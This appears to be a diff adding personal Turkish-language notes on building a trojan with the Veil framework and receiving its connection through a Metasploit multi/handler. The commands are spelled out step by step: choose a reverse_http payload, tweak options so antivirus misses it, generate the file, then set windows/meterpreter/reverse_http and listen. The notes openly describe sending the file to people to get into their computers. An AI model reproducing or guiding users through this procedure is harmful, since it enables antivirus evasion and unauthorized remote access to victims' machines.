@@ -1,0 +1,25 @@
+Veil dedigimiz bir framework ile trojan olusturuyoruz ve bu trojanla da uzaktaki istedigimiz kullanicinin bilgisayarina erisebiliyoruz.
+ 
+Veil ile trojan olusturma:
+1. cd .. / cd opt / cd Veil / python3 Veil.py ==> Veil acilir.
+2. Evasion toolu ile trojan olusturacagiz so "use 1"
+3. "list" ve listeden herhangi bir dille yazilmis rev_http sonlu bir dosyayi sec use komutu ile (use 26)
+4. Antivirusler bunlarin trojan oldugunu kolaylikla tespit edebiliyor. Optional degerleri degistirerek gizlenme ihtimalini cok arttirirsin.bu islemi hallettikten sonra 
+5. Trojani kaydetme ==> generate komutunu calistirdiktan sonra trojanimiza bir isim veriyoruz ve belirtilen klasor icerisinde olusturulur.
+
+
+
+
+---Trojanimizi kisi acarsa ve antivirusleri gecebilirsek...
+Bizim o bilgisayara erisim saglayabilmemiz icin o baglantiyi bekliyor olmamiz lazim. Bunun icin de metasploitable framework kullanacagiz. 
+----------------MULTI HANDLER----------------------
+1. msfconsole
+2. use exploit/multi/handler(bu modulu calistirdik)
+3. Bir payload tanimlamamiz lazim modulun ici bos.biz reverse http kullanmistik backdooru olustururken bu yuzden set payload diyip window dedikten sonra hangi sessionu kullandigimizi(Payload module: diye dosyayi olusturduktan sonra gorebilirsin.) yazacagiz.
+	set PAYLOAD windows/meterpreter/reverse_http
+show options diyip secenekleri gorebilirz.
+lhostu eklemeliyiz (kendi ipmiz)
+4. Exploit (daha onceden bir hacking islemine baslardik bu komut ile birlikte ama suan dinlemeye basladi program.Gelen baglantilari dinliyor)(yani bu asamadan sonra insanlara dosyayi atacagiz)
+
+Eger tum islemler basarili olursa kullanicinin direk bilgisayarina erisim saglamis oluruz.
+
